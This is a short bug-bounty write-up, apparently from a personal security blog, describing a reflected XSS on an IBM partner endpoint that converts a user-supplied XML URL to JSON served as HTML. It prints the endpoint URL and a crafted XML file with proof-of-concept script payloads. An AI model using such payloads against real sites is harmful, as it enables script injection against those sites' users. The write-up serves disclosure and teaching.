<!doctype html><html lang=en-us><head><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/images/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon-16x16.png><link rel=manifest href=/images/site.webmanifest><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="simple writeup about XSS Reflected on ibm subdomain"><title>[IBM] XSS Reflected via xml files | Classic</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css><link rel=stylesheet href=/css/theme-override.css><header><nav><ul><li class=pull-left><a href=/>~/classic</a></li><li class=pull-left><a href=/tags/>~/tags</a></li><li class=pull-right><a href=/index.xml>~/rss</a></li></ul></nav></header></head><body><br><div class=article-meta><h1><span class=title>[IBM] XSS Reflected via xml files</span></h1><h2 class=date>2020/10/26</h2><p class=terms>Tags: <a href=/tags/bugbounty>bugbounty</a> <a href=/tags/security>security</a> <a href=/tags/webpentesting>webpentesting</a></p></div><div class=content-wrapper><main><p>Hello World üëã
while I&rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from <code>waybackurls</code> to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in <code>rssurl</code> parameter</p><pre tabindex=0><code>https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;rssurl=https://www-2000.ibm.com/file.xml&amp;_=1596170198353
</code></pre><p><img src=https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png alt=ibm_xml></p><p>all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&rsquo;t work at all</p><p><img src=https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif alt=noway></p><p>but from another side, I noticed that the response <code>Content-type</code> is <code>text/HTML</code> so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this <code>{"data": "&lt;script>alert(123)&lt;/script>"}</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span><span style=color:#f92672>&lt;html&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;head&gt;&lt;/head&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;body&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;something:script</span> <span style=color:#a6e22e>xmlns:something=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(1)<span style=color:#f92672>&lt;/something:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;a:script</span> <span style=color:#a6e22e>xmlns:a=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(2)<span style=color:#f92672>&lt;/a:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;info&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;value&gt;</span><span style=color:#75715e>&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;description&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>Hello<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/description&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;url&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>http://google.com<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/url&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/info&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/html&gt;</span>
</span></span></code></pre></div><p>then upload the file to my site and pass the URL to the rssurl parameter</p><p>the file should be converted like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;html&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;head&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;body&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;script&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(1)&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(2)&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;info&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;name&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;__cdata&#34;</span>: <span style=color:#e6db74>&#34;&lt;script&gt;confirm(document.domain)&lt;/script&gt;&#34;</span>
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;description&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;Hello&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;url&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;http://google.com&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>and boom</p><p><img src=https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png alt=xss_boom></p><p>see ya ü§û ‚ù§Ô∏è</p><a href=/>>> Home</a></main></div><footer><script>(function(){function n(e){var t,n,o,s=document.getElementsByTagName(e);for(n=0;n<s.length;n++)if(o=s[n],t=o.parentElement,t.childNodes.length===1){if(t.nodeName==="A"&&(t=t.parentElement,t.childNodes.length!=1))continue;t.nodeName==="P"&&(t.style.textAlign="center")}}for(var t=["img","embed","object"],e=0;e<t.length;e++)n(t[e])})()</script><hr><a href=https://github.com/knassar702>Github</a> | <a href=https://twitter.com/knassar702>twitter</a></footer></body></html>